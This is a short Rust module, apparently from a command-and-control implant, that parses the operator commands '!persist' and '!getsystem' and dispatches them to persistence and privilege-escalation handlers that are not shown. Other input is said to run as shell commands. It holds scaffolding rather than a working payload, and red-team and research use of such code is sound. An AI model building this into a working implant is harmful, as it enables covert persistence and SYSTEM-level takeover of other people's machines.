mod getsystem;
mod persist;

///
/// The enum that defines the commands we'll interpret 
/// directly instead of as shell commands 
/// 
#[derive(Debug)]
pub enum C2Command {
    Persist,
    GetSystem,
}

///
/// Parses the incoming command text into a known [C2Command]
/// 
pub fn parse_command(cmd_str: &str) -> Option<C2Command> {
    match cmd_str.trim() {
        "!persist" => Some(C2Command::Persist),
        "!getsystem" => Some(C2Command::GetSystem),
        _ => None,
    }
}

///
/// Passes the Command type to its handler, along with any necessary args
/// 
pub fn handle(c2_command: C2Command) -> Result<String, String> {
    use C2Command::*;
    match c2_command {
        Persist => persist::handle(),
        GetSystem => getsystem::handle(),
    }
}
